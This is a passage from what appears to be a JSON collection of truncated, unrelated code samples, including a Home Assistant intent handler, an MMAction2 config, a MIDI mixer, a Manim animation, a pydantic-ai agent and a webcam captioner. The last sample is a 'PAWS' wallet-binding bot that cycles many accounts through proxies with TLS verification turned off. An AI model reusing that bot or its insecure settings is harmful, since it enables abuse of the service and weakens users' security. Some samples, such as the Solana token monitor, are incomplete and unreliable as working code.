to target all devices in the house\n            raise IntentHandleError(\"Service handler cannot target all devices\")\n        state = await self._get_matched_state(intent_obj, match_constraints)\n        entity_registry = er.async_get(self.hass)\n        if entity := entity_registry.async_get(state.entity_id):\n            return entity.unique_id.split(\"mass_\", 1)[1]\n        raise intent.IntentHandleError(\n            f\"No entities matched for: name={name}, area_name={area_name}\"\n        )\n\n    async def _get_media_items(\n        self, mass: MusicAssistantClient, media_id: str | list[str], media_type\n    ) -> MediaItemType | list[MediaItemType]:\n        if isinstance(media_id, list):\n            return [\n                (\n                    await mass.music.get_item_by_name(\n       ",
    "_base_ = [\n    '../../_base_/schedules/sgd_tsm_50e.py', '../../_base_/default_runtime.py'\n]\n\n# model settings\nmodel = dict(\n    type='Recognizer2D',\n    backbone=dict(\n        type='ResNetTSM',\n        pretrained='torchvision://resnet50',\n        depth=50,\n        norm_eval=False,\n        shift_div=8),\n    cls_head=dict(\n        type='TSMHead',\n        num_classes=174,\n        in_channels=2048,\n        spatial_type='avg',\n        consensus=dict(type='AvgConsensus', dim=1),\n        dropout_ratio=0.5,\n        init_std=0.001,\n        is_shift=True),\n    # model training and testing settings\n    train_cfg=dict(\n        blending=dict(type='MixupBlending', num_classes=174, alpha=.2)),\n    test_cfg=dict(average_clips='prob'))\n\n# dataset settings\ndataset_type = 'RawframeDataset'\ndata_root = 'data/sthv1/rawframes'\ndata_root_val = 'data/sthv1/rawframes'\nann_file_train = 'data/sthv1/sthv1_train_list_rawframes.txt'\nann_file_val = 'data/sthv1/sthv1_val_list_rawframes.txt'\nann_file_test = 'data/sthv1/sthv1_val_list_rawframes.txt'\nimg_norm_cfg = dict(\n    mean=[123.675, 116.28, 103.53], std=[58.395, 57.12, 57.375], to_bgr=False)\ntrain_pipeline = [\n    dict(type='SampleFrames', clip_len=1, frame_interval=1, num_clips=8),\n    dict(type='RawFrameDecode'),\n    dict(type='Resize', scale=(-1, 256)),\n    dict(\n        type='MultiScaleCrop',\n        input_size=224,\n        scales=(1, 0.875, 0.75, 0.66),\n        random_crop=False,\n        max_wh_scale_gap=1,\n        num_fixed_crops=13),\n    dict(type='Resize', scale=(224, 224), keep_ratio=False),\n    dict(type='Normalize', **img_norm_cfg),\n    dict(type='FormatShape', input_format='NCHW'),\n    dict(type='Collect', keys=['imgs', 'label'], meta_keys=[]),\n    dict(type='ToTensor', keys=['imgs', 'label'])\n]\nval_pipeline = [\n    dict(\n        type='SampleFrames',\n        clip_len=1,\n        frame_interval=1,\n        num_clips=8,\n        test_mode=True),\n    dict(type='RawFrameDecode'),\n    dict(type='Resize', scale=(-1, 256)),\n    dict(type='CenterCrop', crop_size=224),\n    dict(type='Normalize', **img_norm_cfg),\n    dict(type='FormatShape', input_format='NCHW'),\n    dict(type='Collect', keys=['imgs', 'label'], meta_keys=[]),\n    dict(type='ToTensor', keys=['imgs'])\n]\ntest_pipeline = [\n    dict(\n        type='SampleFrames',\n        clip_len=1,\n        frame_interval=1,\n        num_clips=8,\n        twice_sample=True,\n        test_mode=True),\n    dict(type='RawFrameDecode'),\n    dict(type='Resize', scale=(-1, 256)),\n    dict(type='ThreeCrop', crop_size=256),\n    dict(type='Normalize', **img_norm_cfg),\n    dict(type='FormatShape', input_format='NCHW'),\n    dict(type='Collect', keys=['imgs', 'label'], meta_keys=[]),\n    dict(type='ToTensor', keys=['imgs'])\n]\ndata = dict(\n    videos_per_gpu=8,\n    workers_per_gpu=4,\n    train=dict(\n        type=dataset_type,\n        ann_file=ann_file_train,\n        data_prefix=data_root,\n        filename_tmpl='{:05}.jpg',\n        pipeline=train_pipeline),\n    val=dict(\n        type=dataset_type,\n        ann_file=ann_file_val,\n        data_prefix=data_root_val,\n        filename_tmpl='{:05}.jpg',\n        pipeline=val_pipeline),\n    test=dict(\n        type=dataset_type,\n        ann_file=ann_file_test,\n        data_prefix=data_root_val,\n        filename_tmpl='{:05}.jpg',\n        pipeline=test_pipeline))\nevaluation = dict(\n    interval=2, metrics=['top_k_accuracy', 'mean_class_accuracy'])\n\n# optimizer\noptimizer = dict(weight_decay=0.0005)\n\n# runtime settings\nwork_dir = './work_dirs/tsm_r50_mixup_1x1x8_50e_sthv1_rgb/'\n",
    "from mappings import Mapping\nfrom gui import MixerBoard\nimport time\nimport threading\n\nclass Messages:\n    \n    \n    \n    @staticmethod\n    def handle_midi_message(message):\n        #print(message)\n        if message.type == Mapping.MessageType.CONTROL_CHANGE.value:\n            if message.control in Mapping.FADER:\n                Messages.handle_fader_message(message)\n            elif message.control in Mapping.KNOB and (Messages._knob_check_accepted_values(Mapping.KNOB[message.control], message) or Messages._knob_check_scale_range(Mapping.KNOB[message.control], message)):\n                Messages.handle_knob_message(message)\n            else:\n                if message.control in Mapping.BUTTON:\n                    if message.value in Mapping.BUTTON[message.control].extra[\"accepted_values\"]:\n                        Messages.handle_button_message(message)\n\n        elif message.type == Mapping.MessageType.NOTE_ON.value or message.type == Mapping.MessageType.NOTE_OFF.value:\n                if message.note in Mapping.BUTTON:\n                    Messages.handle_button_message(message)\n                else:\n                    print(f\"Unmapped Note On: {message.note}, Velocity: {message.velocity}\")\n\n#        elif message.type == Mapping.MessageType.NOTE_OFF.value:\n#            print(f\"Note Off: {message.note}\")\n\n        elif message.type == Mapping.MessageType.PITCHWHEEL.value:\n            # Only Faders\n            Messages.handle_fader_message(message)\n\n        else:\n            print(f\"Unhandled Message: {message}\")\n\n    def _knob_check_accepted_values(knob, message):\n        return \"accepted_values\" in knob.extra and message.value in knob.extra[\"accepted_values\"] and message.value in knob.extra[\"accepted_values\"]\n        \n\n    def _knob_check_scale_range(knob, message):\n        if \"scale_range\" in knob.extra:\n            min_value, max_value = knob.extra[\"scale_range\"]\n            return min_value <= message.value <= max_value\n        return False\n\n    def handle_knob_message(message):\n        knob = Mapping.KNOB[message.control]\n        knob_value = message.value\n        if knob.scale_type == \"binary\":\n            if knob_value == Mapping.KnobMessage.UP.value:\n                knob_value = 1\n            elif knob_value == Mapping.KnobMessage.DOWN.value:\n                knob_value = -1\n        elif knob.scale_type == \"linear\":\n            knob_value = knob_value / 127\n        #print(f\"Knob: {Mapping.KNOB[message.control].name}, Value: {knob_value}\")\n        # Knob\n        extra_args = MixerBoard.extra_args[knob.name] if knob.name in MixerBoard.extra_args else None\n        function = MixerBoard.get_function_by_component_name(knob.name)\n\n        if not function:\n            return\n\n        knob_number = int(knob.name.split(\"_\")[-1])\n\n        list_extra_args = list(extra_args) if extra_args else []\n        list_extra_args.insert(0, knob_number)\n\n        extra_args = tuple(list_extra_args)\n\n        try:\n            function.call(knob_value, *extra_args)\n        except Exception as e:\n            print(f\"Knob: Error calling function {function} with args {extra_args}: {e}\")\n    \n    def handle_fader_message(message):\n        if message.type == Mapping.MessageType.PITCHWHEEL.value:\n            fader = Mapping.FADER[message.channel]\n        elif message.type == Mapping.MessageType.CONTROL_CHANGE.value:\n            fader = Mapping.FADER[message.control]\n            \n        \n        if fader.scale_type == \"signed\":\n            fader_value = message.pitch\n            min_value, max_value = fader.extra[\"scale_range\"]\n            if fader_value > 0:\n                fader_value = fader_value / max_value\n            elif fader_value < 0:\n                fader_value = fader_value / -min_value\n        elif fader.scale_type == \"unsigned\":\n            min_value, max_value = fader.extra[\"scale_range\"]\n            fader_value = message.value / max_value\n        #print(f\"Fader: {fader.name}, Value: {fader_value}\")\n        \n        extra_args = MixerBoard.get_extra_args(fader.name)\n        function = MixerBoard.get_function_by_component_name(fader.name)\n\n        # Fader\n        if not function:\n            return\n\n        if function.get_signed() == False:\n            fader_value = (fader_value + 1) / 2\n\n        print(\"fader_name\", fader.name, \"fader_number\", fader.name.split(\"_\")[-1])\n        fader_number = int(fader.name.split(\"_\")[-1])\n\n        list_extra_args = list(extra_args) if extra_args else []\n        list_extra_args.insert(0, fader_number)\n\n        extra_args = tuple(list_extra_args)\n\n        try:\n            Messages.throttled_process(fader.name, fader_value, function.get_message_rate(), function.call, extra_args)\n        except Exception as e:\n            print(f\"Fader: Error calling function {function} with args {extra_args}: {e}\")\n\n    def handle_button_message(message):\n        #print(\"handling button message\")\n        if message.type == Mapping.MessageType.NOTE_ON.value or message.type == Mapping.MessageType.NOTE_OF",
    "import requests\r\nimport time\r\n\r\n# Function to fetch the first 100 Solana tokens from Dexscreener API\r\ndef fetch_solana_tokens():\r\n    url = \"https://api-v3.raydium.io/\"\r\n    \r\n    # Send request to the API\r\n    response = requests.get(url)\r\n    \r\n    # Check if the response is valid\r\n    if response.status_code == 200:\r\n        data = response.json()\r\n        \r\n  \r\n\r\n# Function to print tokens in a loop\r\ndef print_tokens():\r\n    while True:\r\n        tokens = fetch_solana_tokens()\r\n        \r\n        if tokens:\r\n            print(\"\\nNew Tokens:\\n\")\r\n            for token in tokens:\r\n                name = token.get(\"name\", \"N/A\")\r\n                ca = token.get(\"address\", \"N/A\")  # Get the contract address\r\n                \r\n                print(f\"+ {name} ({ca})\")\r\n        \r\n        # Wait for 10 seconds before checking again\r\n        print(\"\\nWaiting for the next check...\\n\")\r\n        time.sleep(10)\r\n\r\n# Start the process\r\nif __name__ == \"__main__\":\r\n    print(\"Starting Solana token monitor...\\n\")\r\n    print_tokens()\r\n",
    "from __future__ import annotations\r\n\r\nfrom manimlib import *\r\nimport numpy as np\r\n\r\ndef quad(axis: np.ndarray, angle: float):\r\n    vec = unit(angle/2)\r\n    return np.array([axis[0]*vec[1], axis[1]*vec[1], axis[2]*vec[1], vec[0]])\r\n\r\n#################################################################### \r\n\r\nclass Digit(VGroup):\r\n    def __init__(self, digit: int = 0, **kwargs):\r\n        \r\n        colors = [GREY, RED, GREEN, BLUE, ORANGE, GOLD, PURPLE_B, MAROON_B, PINK, TEAL]\r\n        number = MTex(str(digit))\r\n        square = Square(side_length = 0.45, fill_opacity = 0.3)\r\n        super().__init__(square, number, **kwargs)\r\n        self.set_color(colors[digit])\r\n        self.digit = digit\r\n\r\n    # def __str__(self):\r\n    #     return str(self.digit)\r\n\r\nclass Flip(Animation):\r\n    CONFIG = {\r\n        \"dim\": 0,\r\n        \"color_interpolate\": False\r\n    }\r\n\r\n    def __init__(\r\n        self,\r\n        mobject: Mobject,\r\n        target_mobject: Mobject | None = None,\r\n        **kwargs\r\n    ):\r\n        super().__init__(mobject, **kwargs)\r\n        self.target_mobject = target_mobject\r\n    \r\n    def interpolate_mobject(self, alpha: float) -> None:\r\n        if alpha <= 0.5:\r\n            vector = np.array([1., 1., 1.])\r\n            vector[self.dim] = 1-2*alpha\r\n            self.mobject.become(self.starting_mobject).scale(vector, min_scale_factor = 0)\r\n        else:\r\n            vector = np.array([1., 1., 1.])\r\n            vector[self.dim] = 2*alpha-1\r\n            self.mobject.become(self.target_mobject).scale(vector, min_scale_factor = 0)\r\n        if self.color_interpolate:\r\n            self.mobject.set_color(interpolate_color(self.starting_mobject.get_color(), self.target_mobject.get_color(), alpha))\r\n        return self\r\n    \r\n#################################################################### \r\n\r\nclass Video_0(FrameScene):\r\n    def construct(self):\r\n\r\n        ##  Making object\r\n        quote = Text(\"\u5982\u679c\u4e16\u754c\u7684\u53d8\u5316\u662f\u7ebf\u6027\u7684\uff0c\\n\u4e24\u500d\u7684\u4eca\u5929\u51cf\u53bb\u6628\u5929\uff0c\u5c31\u80fd\u9884\u77e5\u660e\u5929\u7684\u4e00\u5207\uff0c\\n\u90a3\u8be5\u662f\u591a\u4e48\u7f8e\u5999\u548c\u67af\u71e5\u554a\u3002\", font = 'simsun', t2c={\"\u7ebf\u6027\": GREEN, (\"\u4eca\u5929\", \"\u6628\u5929\", \"\u660e\u5929\"): BLUE, (\"\u7f8e\u5999\", \"\u67af\u71e5\"): YELLOW})\r\n        author = Text(\"-Tarski Sch\u00f6lder\", color = YELLOW, font = \"Times New Roman\")\r\n        author.next_to(quote.get_corner(DR), DL)\r\n        ##  Showing object\r\n        self.play(Write(quote), runtime = 2)\r\n        self.play(Write(author))\r\n        self.wait()\r\n        self.play(FadeOut(quote), FadeOut(author))\r\n        self.wait()\r\n\r\nclass Patch0_1(FrameScene):\r\n    def construct(self):\r\n\r\n        ##  Making object\r\n        texts = [r\"\\begin{vmatrix}a_{11}&a_{12}&\\cdots&a_{1n}\\\\a_{21}&a_{22}&\\cdots&a_{2n}\\\\\\vdots&\\vdots&\\ddots&\\vdots\\\\a_{n1}&a_{n2}&\\cdots&a_{nn}\\end{vmatrix}\"\r\n                , r\"=a_{i1}A_{i1}+a_{i2}A_{i2}+\\cdots+a_{in}A_{in}\"]\r\n        det = MTex(texts[0]+texts[1], isolate = texts)\r\n        part_0, part_1 = det.get_part_by_tex(texts[0]).save_state().set_x(0), det.get_part_by_tex(texts[1])\r\n        self.play(FadeIn(part_0))\r\n        self.wait()\r\n        self.play(part_0.animate.restore())\r\n        self.play(Write(part_1), rate_func = rush_from)\r\n        self.wait()\r\n\r\nclass Notices(NoticeScene):\r\n    CONFIG = {\r\n        \"extra_frames\": False,\r\n    }\r\n    def construct(self):\r\n        self.notices = [Notice(\"\u5854\u65af\u57fa\u00b7\u7855\u5fb7\", \"\u8bf7\u52ff\u6a21\u4eff\"), \r\n                        Notice(\"\u89c6\u9891\u524d\u8a00\", \"\u8bf7\u542c\u4ecb\u7ecd\"),\r\n                        Notice(\"\u7b80\u5355\u89c4\u5f8b\", \"\u8bf7\u3000\u719f\u7ec3\"),\r\n                        Notice(\"\u5413\u4eba\u516c\u5f0f\", \"\u8bf7\u3000\u5ffd\u7565\"),\r\n                        Notice(\"\u91cd\u8981\u6982\u5ff5\", \"\u8bf7\u8bb0\u7b14\u8bb0\"),\r\n                        Notice(\"OZO\", \"ULU\"),\r\n                        Notice(\"\u7b80\u5355\u4f8b\u5b50\", \"\u8bf7\u3000\u7406\u89e3\"),\r\n                        Notice(\"\u91cd\u8981\u6982\u5ff5\", \"\u8bf7\u8bb0\u7b14\u8bb0\"),\r\n                        Notice(\"\u7b80\u5355\u60c5\u666f\", \"\u8bf7\u3000\u8212\u9002\"),\r\n                        Notice(\"\u7b80\u5355\u4f8b\u5b50\", \"\u8bf7\u3000\u9a8c\u8bc1\"),\r\n                        Notice(\"\u5c0f\u5b66\u5965\u6570\", \"\u8bf7\u3000\u590d\u4e60\"),\r\n                        Notice(\"\u521d\u4e2d\u6570\u5b66\", \"\u8bf7\u3000\u590d\u4e60\"),\r\n                        Notice(\"\u7ebf\u6027\u6620\u5c04\", \"\u7ecf\u5178\u4f8b\u9898\"),\r\n                        Notice(\"\u4e00\u6b21\u65b9\u7a0b\u7ec4\", \"\u8bf7\u3000\u6c42\u89e3\")]\r\n        self.notice = self.notices[0]\r\n        self.play(Write(self.notice))\r\n        self.wait(1)\r\n        for i in range(1, len(self.notices)):\r\n            self.play(Transform(self.notice, self.notices[i]))\r\n            self.wait(1)\r\n        self.play(FadeOut(self.notice))\r\n        self.wait(1)\r\n\r\nclass Video_1(FrameScene):\r\n    def construct(self):\r\n        title = Text(\"\u7ebf\u6027\u4ee3\u6570\", font = \"FZShuSong-Z01S\").scale(2)\r\n        for i in range(4):\r\n            title[i].shift((i-1.5)*0.2*RIGHT)\r\n        left = title[0:2]\r\n        right = title[2:]\r\n        self.play(Write(title))\r\n        self.wait()\r\n        self.play(left.animate.scale(1.5).set_color(YELLOW).shift(LEFT), right.animate.scale(0.75).set_fill(opacity = 0.5))\r\n        self.wait()\r\n        self.play(right.animate.scale(2).set_fill(color = YELLOW, opacity = 1).shift(RIGHT), left.animate.scale(2/3).set_fill(color = WHITE, opacity = 0.5))\r\n        self.wait()\r\n\r\n        title = Title(\"\u4ee3\u6570\")\r\n        for i in range(2):\r\n            title[i].shift((i-0.5)*0.1*RIGHT)\r\n        title_line = TitleLine()\r\n        self.play(FadeOut(left), ReplacementTransform(right, title))\r\n  ",
    "from __future__ import annotations as _annotations\n\nimport asyncio\nimport os\nfrom dataclasses import dataclass\nfrom datetime import datetime\nfrom typing import Any\n\nimport logfire\nfrom devtools import debug\nfrom httpx import AsyncClient\nfrom dotenv import load_dotenv\n\nfrom openai import AsyncOpenAI\nfrom pydantic_ai.models.openai import OpenAIModel\nfrom pydantic_ai import Agent, ModelRetry, RunContext\nfrom youtube_transcript_api import YouTubeTranscriptApi\nfrom youtube_transcript_api.formatters import TextFormatter\n\nload_dotenv()\nllm = os.getenv('LLM_MODEL', 'gpt-4o')\n\n\nmodel = OpenAIModel(llm) \n\n# 'if-token-present' means nothing will be sent (and the example will work) if you don't have logfire configured\n# logfire.configure(send_to_logfire='if-token-present')\n\n# Configure Logfire with more detailed settings\nlogfire.configure(\n    token =os.getenv('LOGFIRE_TOKEN', None),\n    send_to_logfire='if-token-present',\n    service_name=\"web-search-agent\",\n    service_version=\"1.0.0\",\n    environment=os.getenv('ENVIRONMENT', 'development'),\n\n)\n\n# Class for dependencies for agent (will be injected from ui)\n@dataclass\nclass Deps:\n    client: AsyncClient\n    brave_api_key: str | None\n\n\nai_agent = Agent(\n    model,\n    system_prompt=\n        '''You are an expert at researching the web to answer user questions. \n        Format your response in markdown and provide citations as well as the sources at the end of the response. \n        You also have the ability to fetch the transcript of Youtube Videos. Use this functionality to generate notes in markdown format based on the content of a youtube video.\n\n        When taking notes use the following guidelines:\n            Please summarize the following information as structured notes. Focus on capturing key points, omitting unnecessary details, and using bullet points or short paragraphs for readability. Prioritize clarity and conciseness by highlighting:\n                1. **Main topics or sections**\n                2. **Key points, insights, or findings**\n                3. **Supporting details** (only if essential)\n                4. **Action items or next steps** (if applicable)\n                5. **Dates, names, or specific terms** (only if relevant)\n\n                Format the notes in bullet points or short, clear sentences. Avoid repetition or filler words. Aim for a summary that is easy to scan and ideal for quick reference.\n    \n        ''',\n    deps_type=Deps,\n    retries=2\n)\n\n\n@ai_agent.tool\nasync def search_web(\n    ctx: RunContext[Deps], web_query: str\n) -> str:\n    \"\"\"\n     \n    Search the web given a query defined to answer the user's question.\n\n    Args:\n        ctx: The context.\n        web_query: The query for the web search.\n\n    Returns:\n        str: The search results as a formatted string.\n    \"\"\"\n    if ctx.deps.brave_api_key is None:\n        return \"This is a test web search result. Please provide a Brave API key to get real search results.\"\n\n    headers = {\n        'X-Subscription-Token': ctx.deps.brave_api_key,\n        'Accept': 'application/json',\n    }\n    \n    with logfire.span('calling Brave search API', query=web_query) as span:\n        r = await ctx.deps.client.get(\n            'https://api.search.brave.com/res/v1/web/search',\n            params={\n                'q': web_query,\n                'count': 5,\n                'text_decorations': True,\n                'search_lang': 'en'\n            },\n            headers=headers\n        )\n        r.raise_for_status()\n        data = r.json()\n        span.set_attribute('response', data)\n\n    results = []\n    \n    # Add web results in a nice formatted way\n    web_results = data.get('web', {}).get('results', [])\n    for item in web_results[:3]:\n        title = item.get('title', '')\n        description = item.get('description', '')\n        url = item.get('url', '')\n        if title and description:\n            results.append(f\"Title: {title}\\nSummary: {description}\\nSource: {url}\\n\")\n\n    return \"\\n\".join(results) if results else \"No results found for the query.\"\n\n@ai_agent.tool\nasync def get_youtube_transcript(\n    ctx: RunContext[Deps], video_url: str\n)-> str:\n    \"\"\"\n     \n    Get the transcript of a YouTube video. Use this to take generate notes in markdown format based on the content of a youtube video.\n\n    Args:\n        ctx: The context.\n        video_url: The URL of the YouTube video.\n\n    Returns:\n        str: The transcript of the video.\n    \"\"\"\n    with logfire.span('getting YouTube transcript', video_url=video_url) as span:\n        if not video_url.startswith('https://www.youtube.com/watch?v='):\n            return \"Invalid YouTube video URL. Please provide a valid YouTube video URL.\"\n        video_id = video_url.split('v=')[-1]\n        transcript = YouTubeTranscriptApi.get_transcript(video_id)\n        formatter = TextFormatter()\n        formatted_transcript = formatter.format_transcript(transcript)\n        span.set_attribute('transcript', formatted_transcript)\n    \n    return formatted_tran",
    "import cv2\nfrom transformers import AutoProcessor, AutoModelForImageTextToText\nimport torch\nimport logging\nimport time\nfrom PIL import Image\nimport sys\nfrom threading import Thread, Lock\nfrom queue import Queue\n\ndef setup_logging():\n    \"\"\"Configure logging with basic formatting\"\"\"\n    logging.basicConfig(\n        level=logging.INFO,\n        format='%(asctime)s - %(levelname)s - %(message)s'\n    )\n    return logging.getLogger(__name__)\n\nclass CaptionGenerator:\n    def __init__(self, processor, model, device):\n        self.processor = processor\n        self.model = model\n        self.device = device\n        self.current_caption = f\"Initializing caption... ({device.upper()})\"\n        self.caption_queue = Queue(maxsize=1)\n        self.lock = Lock()\n        self.running = True\n        self.thread = Thread(target=self._caption_worker)\n        self.thread.daemon = True\n        self.thread.start()\n\n    def _caption_worker(self):\n        while self.running:\n            try:\n                if not self.caption_queue.empty():\n                    frame = self.caption_queue.get()\n                    caption = self._generate_caption(frame)\n                    with self.lock:\n                        self.current_caption = caption\n            except Exception as e:\n                logging.error(f\"Caption worker error: {str(e)}\")\n            time.sleep(0.1)  # Prevent busy waiting\n\n    def _generate_caption(self, image):\n        try:\n            # Resize to 640x480 (or any other size)\n            image_resized = cv2.resize(image, (640, 480))\n\n            # Convert to RGB\n            rgb_image = cv2.cvtColor(image_resized, cv2.COLOR_BGR2RGB)\n            pil_image = Image.fromarray(rgb_image)\n\n            # Process the image for captioning\n            inputs = self.processor(images=pil_image, return_tensors=\"pt\")\n            inputs = {name: tensor.to(self.device) for name, tensor in inputs.items()}\n\n            with torch.no_grad():\n                outputs = self.model.generate(\n                    **inputs,\n                    max_length=30,\n                    num_beams=5,\n                    num_return_sequences=1\n                )\n\n            caption = self.processor.batch_decode(outputs, skip_special_tokens=True)[0].strip()\n            return f\"BLIP: {caption} ({self.device.upper()})\"\n        except Exception as e:\n            logging.error(f\"Caption generation error: {str(e)}\")\n            return f\"BLIP: Caption generation failed ({self.device.upper()})\"\n\n    def update_frame(self, frame):\n        if self.caption_queue.empty():\n            try:\n                self.caption_queue.put_nowait(frame.copy())\n            except:\n                pass  # Queue is full, skip this frame\n\n    def get_caption(self):\n        with self.lock:\n            return self.current_caption\n\n    def stop(self):\n        self.running = False\n        self.thread.join()\n\ndef get_gpu_usage():\n    \"\"\"Get the GPU memory usage and approximate utilization\"\"\"\n    if torch.cuda.is_available():\n        memory_allocated = torch.cuda.memory_allocated() / (1024 ** 2)  # MB\n        memory_total = torch.cuda.get_device_properties(0).total_memory / (1024 ** 2)  # MB\n\n        memory_used_percent = (memory_allocated / memory_total) * 100\n        gpu_info = f\"GPU Memory Usage: {memory_used_percent:.2f}% | Allocated: {memory_allocated:.2f} MB / {memory_total:.2f} MB\"\n        \n        return gpu_info\n    else:\n        return \"GPU not available\"\n\ndef load_models():\n    \"\"\"Load BLIP model\"\"\"\n    try:\n        blip_processor = AutoProcessor.from_pretrained(\"Salesforce/blip-image-captioning-large\")\n        blip_model = AutoModelForImageTextToText.from_pretrained(\"Salesforce/blip-image-captioning-large\")\n\n        device = 'cuda' if torch.cuda.is_available() else 'cpu'\n        if device == 'cuda':\n            # Set GPU memory usage limit to 90%\n            torch.cuda.set_per_process_memory_fraction(0.9)\n            blip_model = blip_model.to('cuda')\n\n        return blip_processor, blip_model, device\n    except Exception as e:\n        logging.error(f\"Failed to load models: {str(e)}\")\n        return None, None, None\n\ndef live_stream_with_caption(processor, model, device, display_width=1280, display_height=720):\n    \"\"\"Stream webcam feed with live captions and FPS\"\"\"\n    cap = cv2.VideoCapture(1)\n    if not cap.isOpened():\n        cap = cv2.VideoCapture(0)\n    if not cap.isOpened():\n        logger.error(\"Failed to access webcam.\")\n        return\n\n    cap.set(cv2.CAP_PROP_FRAME_WIDTH, display_width)\n    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, display_height)\n\n    logger.info(f\"Webcam feed started successfully using {device.upper()}.\")\n    caption_generator = CaptionGenerator(processor, model, device)\n\n    prev_time = time.time()  # Track time to calculate FPS\n\n    try:\n        while True:\n            ret, frame = cap.read()\n            if not ret:\n                logger.error(\"Failed to read frame from webcam.\")\n                break\n\n            # Update caption and track FPS\n  ",
    "import base58\r\nimport time\r\nimport urllib3\r\nfrom colorama import init, Fore, Style\r\nimport os\r\nimport requests\r\nimport sys\r\nfrom urllib.parse import unquote, parse_qs\r\nimport json\r\nfrom solders.keypair import Keypair\r\nfrom solders.pubkey import Pubkey\r\n\r\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\r\ninit(autoreset=True)\r\nred = Fore.LIGHTRED_EX\r\nblue = Fore.LIGHTBLUE_EX\r\ngreen = Fore.LIGHTGREEN_EX\r\nyellow = Fore.LIGHTYELLOW_EX\r\nblack = Fore.LIGHTBLACK_EX\r\nwhite = Fore.LIGHTWHITE_EX\r\nreset = Style.RESET_ALL\r\nmagenta = Fore.LIGHTMAGENTA_EX\r\nproxy = {\r\n    \"http\": \"https://username:password@ip:port\",\r\n    \"https\": \"http://username:password@ip:port\",\r\n}\r\n\r\n\r\ndef get_message(token):\r\n    url = \"https://api.paws.community/v1/wallet/solana/payload\"\r\n    headers = {\r\n        \"Authorization\": f\"Bearer {token}\",\r\n        \"Accept\": \"application/json\"\r\n    }\r\n    start_time = time.time()\r\n    while True:\r\n        try:\r\n            response = requests.get(url, headers=headers, proxies=proxy, verify=False, timeout=10)\r\n            response.raise_for_status()\r\n            data = response.json()\r\n            return data['data']\r\n        except Exception as e:\r\n            pass\r\n        if time.time() - start_time > 30:\r\n            print(\"Timeout reached after 30 seconds\")\r\n            return None\r\n\r\ndef bind_wallet_sol(signature_base58, public_key, payload_token, header_token):\r\n    url = \"https://api.paws.community/v1/wallet/solana/check_proof\"\r\n    payload = {\r\n        \"signature\": signature_base58,\r\n        \"publicKey\": public_key,\r\n        \"token\": payload_token\r\n    }\r\n    headers = {\r\n        \"Authorization\": f\"Bearer {header_token}\",\r\n        \"Content-Type\": \"application/json\",\r\n        \"Accept\": \"application/json\"\r\n    }\r\n    start_time = time.time()\r\n    while True:\r\n        try:\r\n            response = requests.post(url, json=payload, headers=headers, proxies=proxy, verify=False, timeout=10)\r\n            response.raise_for_status()\r\n            return response.json()\r\n        except Exception as e:\r\n            pass\r\n        if time.time() - start_time > 30:\r\n            print(\"Timeout reached after 30 seconds\")\r\n            return None    \r\n\r\ndef auth(query):\r\n    url = \"https://api.paws.community/v1/user/auth\"\r\n    headers = {\r\n    'accept': 'application/json',\r\n    'accept-language': 'en-US,en;q=0.9',\r\n    'content-type': 'application/json',\r\n    'origin': 'https://app.paws.community',\r\n    'priority': 'u=1, i',\r\n    'referer': 'https://app.paws.community/',\r\n    'sec-ch-ua': '\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\", \"Microsoft Edge WebView2\";v=\"131\"',\r\n    'sec-ch-ua-mobile': '?0',\r\n    'sec-ch-ua-platform': '\"Windows\"',\r\n    'sec-fetch-dest': 'empty',\r\n    'sec-fetch-mode': 'cors',\r\n    'sec-fetch-site': 'same-site',\r\n    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',\r\n    }\r\n\r\n    json_data = {\r\n        'data': f'{query}',\r\n    }\r\n    start_time = time.time()\r\n    while True:\r\n        try:\r\n            response = requests.post('https://api.paws.community/v1/user/auth', headers=headers, json=json_data, proxies=proxy, verify=False)\r\n            if response.status_code == 201:\r\n                response = response.json()\r\n                return response\r\n            else:\r\n                return None\r\n        except Exception as e:\r\n            pass\r\n        if time.time() - start_time > 30:\r\n            print(\"Timeout reached after 30 seconds\")\r\n            return None\r\n\r\ndef load_accounts(file_path):\r\n    try:\r\n        with open(file_path, 'r') as f:\r\n            data = [line.strip() for line in f if line.strip()]\r\n        return data\r\n    except FileNotFoundError:\r\n        print(f\"{red}Error: File '{file_path}' not found.{reset}\")\r\n        sys.exit(1)\r\n\r\ndef save_text(filename, text):\r\n    try:\r\n        with open(filename, 'a') as file:\r\n            file.write(text)\r\n    except Exception as e:\r\n        print(f\"Error: {e}\")\r\n\r\ndef main():\r\n    try:\r\n        file_path = 'query.txt'\r\n        emails = load_accounts(file_path)\r\n        if not emails:\r\n            print(f\"{red}No accounts found in the file.{reset}\")\r\n            sys.exit(1)\r\n\r\n        os.system('cls' if os.name == 'nt' else 'clear')\r\n\r\n        banner = f\"\"\"\r\n        {magenta}\u250f\u2513\u250f\u2513\u2513 \u250f\u250f\u2513  {white}PAWS Auto Connect Wallet\r\n        {magenta}\u2503\u2503\u2523\u252b\u2503\u2503\u2503\u2517\u2513  {green}Author : {white}MortyID\r\n        {magenta}\u2523\u251b\u251b\u2517\u2517\u253b\u251b\u2517\u251b  {white}Github : {green}https://github.com/MortyID\r\n        \"\"\"\r\n        print(banner)\r\n        total_balances = 0\r\n        for i, query in enumerate(emails, start=1):\r\n            decode_query = unquote(query)\r\n            parse_query = parse_qs(decode_query)\r\n            user_data = json.loads(parse_query[\"user\"][0])\r\n            username = user_data.get(\"username\", None)\r\n            print(f\"{magenta}==================== {i} ====================\")\r\n\r\n            # Use solders to generate new keypair\r\n ",
